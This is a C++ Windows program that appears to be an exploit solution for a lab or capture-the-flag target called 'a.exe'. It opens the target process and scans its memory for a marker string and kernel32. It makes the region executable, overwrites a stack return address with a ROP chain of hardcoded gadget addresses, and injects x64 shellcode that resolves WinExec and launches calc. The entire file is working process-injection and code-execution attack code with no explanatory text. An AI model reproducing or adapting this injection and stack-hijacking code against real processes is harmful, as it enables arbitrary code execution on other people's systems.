#include <vector>
#include <algorithm>
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

int main() {
  HANDLE proc;

  PROCESSENTRY32 entry;
  entry.dwSize = sizeof(PROCESSENTRY32);

  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
  if (Process32First(snapshot, &entry) == TRUE) {
    while (Process32Next(snapshot, &entry) == TRUE) {
      if (strcmp(entry.szExeFile, "a.exe") == 0) {
        proc = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ, FALSE, entry.th32ProcessID);
        break;
      }
    }
  }

  if (proc == NULL) {
    std::cout << "Open process failed" << std::endl;
  }

  SYSTEM_INFO lpsysteminfo;

  GetSystemInfo(&lpsysteminfo);

  MEMORY_BASIC_INFORMATION info;
  SIZE_T bytesread;

  char tofind[19] = "You can't";
  char tofind2[20] = "kernel32.pdb";
  int len = strlen(tofind);
  int len2 = strlen(tofind2);
  void* it;

  void* target_address;
  void* shellcode_address;
  void* kernel32_address;
  long long offset;
  void* lpbuffer;
  void* stackbuffer;

  for(void* addr = lpsysteminfo.lpMinimumApplicationAddress; VirtualQueryEx(proc, addr, &info, sizeof(info)) == sizeof(info); addr += info.RegionSize) {
    //printf("Base address: %p\n", info.BaseAddress);
    lpbuffer = malloc(info.RegionSize);
    bool res = ReadProcessMemory(proc, info.BaseAddress, lpbuffer, info.RegionSize, &bytesread);
    //printf("Bytes read: %x\n", bytesread);
    bool tofree = true;
    if (bytesread) {
      it = (void*) std::search((char*) lpbuffer, (char*) lpbuffer + bytesread, tofind, tofind + len);
      if (it != lpbuffer + bytesread) {
        printf("Offset: %p\n", (long long)it - (long long)lpbuffer);
        DWORD oldprotect;
        res = VirtualProtectEx(proc, info.BaseAddress, bytesread, 0x40, &oldprotect);
        shellcode_address = info.BaseAddress;
        if (!res) {
          std::cout << "Virtualprotect failed" << std::endl;
        } else {
          std::cout << "Virtual protect " << info.BaseAddress << " + " << bytesread << " succeed" << std::endl;
        }
        printf("Found string at: %x\n", it);
        printf("String: %s\n", it);
        SIZE_T bytes_written = 0;
        //res = WriteProcessMemory(proc, (void*)((long long)info.BaseAddress + (long long)it - (long long)lpbuffer), hacked, strlen(hacked) + 1, &bytes_written);
        offset = (long long)it - (long long)lpbuffer;
        target_address = (void*)((long long)info.BaseAddress);
        stackbuffer = lpbuffer;
        tofree = false;
        //break;
      }
      it = (void*) std::search((char*) lpbuffer, (char*) lpbuffer + bytesread, tofind2, tofind2 + len2);
      if (it != lpbuffer + bytesread) {
        printf("Offset: %p\n", (long long)it - (long long)lpbuffer);
        printf("String: %s\n", it);
        kernel32_address = info.BaseAddress;
      }
    }
    if (tofree)
      free(lpbuffer);
  }
  offset -= 128;
  long long poprdi = 0x0000000000402789;
  long long poprcx = 0x0000000000402a80;
  long long poprdx = 0x0000000000401095;
  long long poprax = 0x000000000040199f;
  printf("Kernel32: %p\n", kernel32_address);
  long long winexec = 0x7ffa8dc7e770;
  long long ropchain[10];
  ropchain[0] = (long long)shellcode_address;
  printf("Winexec: %p\n", winexec);
  char data[8];
  char replace[5];
  replace[0] = 0;
  replace[1] = 0;
  replace[2] = 0;
  replace[3] = 0;
  replace[4] = 0;
  long long nextoff;


  // replace return address
  for (int i = 0; i < 100; i++) {
    nextoff = (long long) stackbuffer + offset - ((long long)(stackbuffer + offset) & 0xf) + i * 8;
    //printf("%p: ", nextoff);
    long long val = 0;
    for (int a = 7; a >= 0; a--) {
      val += (*(long long*)(nextoff + a) & 0xff) << (a * 8);
      //printf("%02x", *(char*)(nextoff + a) & 0xff);
    }
    //printf("\n%llx", val);
    //printf("\n%llx", (val & 0xffff7f0000000000));
    if ((val & (long long) 0xffffffffff400000) == (long long)0x0000000000400000) {
      bool res;
      SIZE_T bytes_written = 0;
      res = WriteProcessMemory(proc, (void*)((long long) (nextoff - (long long)stackbuffer) + target_address), (char*)(&ropchain), 1*8, &bytes_written);
      printf("\nROpchain Bytes written: %d\n", bytes_written);
    }
  } 
  // write shellcode
  char* shellcode = "\x50\x51\x52\x53\x56\x57\x55\x54\x58\x66\x83\xE4\xF0\x50\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x29\xD4\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x68\x5C\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3";
  SIZE_T bytes_written = 0;
  WriteProcessMemory(proc, shellcode_address, shellcode, strlen(shellcode), &bytes_written);
  printf("Shellcode address: %p\n", (long long)shellcode_address);
  printf("Bytes written: %d\n", bytes_written);


  //stop infinite loop
  for (int i = 0; i < 100; i++) {
    nextoff = (long long) stackbuffer + offset - ((long long)(stackbuffer + offset) & 0xf) + i * 4;
    int val = 0;
    for (int a = 3; a >= 0; a--) {
      val += (*(int*)(nextoff + a) & 0xff) << (a * 8);
    }
    if (val == 1) {
      SIZE_T bytes_written = 0;
      bool res;
      res = WriteProcessMemory(proc, (void*)((long long) (nextoff - (long long)stackbuffer) + target_address), replace, 4, &bytes_written);
      printf("\nBytes written: %d\n", bytes_written);
      break;
    }
    printf("\n");
  }
}

